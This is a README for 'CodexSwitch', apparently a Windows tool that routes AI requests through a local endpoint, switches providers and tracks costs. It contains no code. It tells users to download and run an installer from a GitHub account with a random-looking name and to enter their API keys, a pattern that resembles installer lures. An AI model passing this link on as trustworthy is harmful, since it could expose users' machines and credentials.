# 🚀 CodexSwitch - Manage your AI providers with ease

[![](https://img.shields.io/badge/Download_CodexSwitch-007ACC.svg?style=for-the-badge)](https://github.com/unblinking-birth533/CodexSwitch/releases)

CodexSwitch acts as a central hub for your artificial intelligence tools. It connects different AI services into a single interface on your computer. You use this software to manage costs, switch between providers, and keep your data local. It simplifies the setup process by acting as a bridge between your preferred AI tools and various service providers.

## 📥 How to download the software

Follow these steps to get the application on your computer.

1. Visit the [official releases page](https://github.com/unblinking-birth533/CodexSwitch).
2. Look for the latest version at the top of the list.
3. Select the file ending in `.msi` or `.exe` for Windows.
4. Click the link to begin your download.

The software runs on Windows 10 or newer. Ensure your computer has at least 4GB of memory and a stable internet connection.

## ⚙️ Setting up the application

1. Find the downloaded file in your Downloads folder.
2. Double-click the file to start the installer.
3. Follow the prompts on the screen to finish the installation.
4. Open the CodexSwitch icon from your desktop or Start menu once the setup completes.

## 🔗 Using the local endpoint

The application creates a local gateway for your AI requests. This gateway handles communication between your tools and the AI providers. Your tools send requests to this specific address:

`http://127.0.0.1:12785/v1`

Configure your AI software to point to this address to route your traffic through CodexSwitch.

## 🖥️ Understanding the interface

The main window displays your current activity and connection status. You will see several sections designed for daily use.

### Dashboard

The dashboard provides a view of your active AI providers. It shows which services are currently online and ready for requests. You can add new providers here by entering the necessary keys or credentials.

### Configuration

This section manages how CodexSwitch handles your AI traffic. You define your primary provider and set up backup options. If one provider fails or hits a rate limit, the software switches to your designated alternative. This ensures your workflow continues without manual intervention.

### Usage and Costs

The application tracks every request you make. It records the data sent and received for each provider. You can view these logs to monitor your usage patterns. You will see the estimated cost for each session based on the provider data, which helps you stay within your budget.

## 🛡️ Privacy and local control

CodexSwitch keeps your settings and logs on your local machine. No external server collects your request history or personal data. The bridge runs as a background process on your hardware, meaning your data stays within your control at all times.

## 🛠️ Troubleshooting common issues

If you face problems, check these areas first.

*   **Check the status:** Ensure the CodexSwitch application is open and running. If the window hides in your taskbar, restore it to check for error messages.
*   **Verify the port:** The application uses port 12785. If another program uses this port, CodexSwitch will not connect. Close the conflicting application and restart CodexSwitch.
*   **Update your settings:** If your requests fail, check your provider keys in the Configuration tab. Invalid keys cause connection errors.
*   **Check the firewall:** Sometimes Windows Firewall blocks local connections. Allow CodexSwitch through your firewall settings if you receive a network error.

## 📋 Managing your provider list

You can change your providers at any time. Select the Provider Manager tab to add, edit, or remove services. The application supports various protocol dialects, allowing it to translate requests into formats your specific AI provider understands. This feature makes it possible to use tools that might otherwise be incompatible with your chosen provider.

## 💾 Saving your workflow

CodexSwitch automatically saves your configuration files. If you need to move your settings to a new computer, navigate to the application folder in your local settings directory. Copy the configuration file to the same location on the new machine. This transition preserves your keys and usage history.

## 📈 Improving performance

The software runs efficiently on most modern hardware. To maintain speed, keep the application updated. The developers release new versions to support fresh AI models and improve conversion protocols. Use the "Check for Updates" button in the About menu to find the latest version.

By directing your AI traffic through this hub, you create a private and flexible workstation. You gain control over which providers you use and how you pay for your tokens, while protecting your data streams from unnecessary exposure.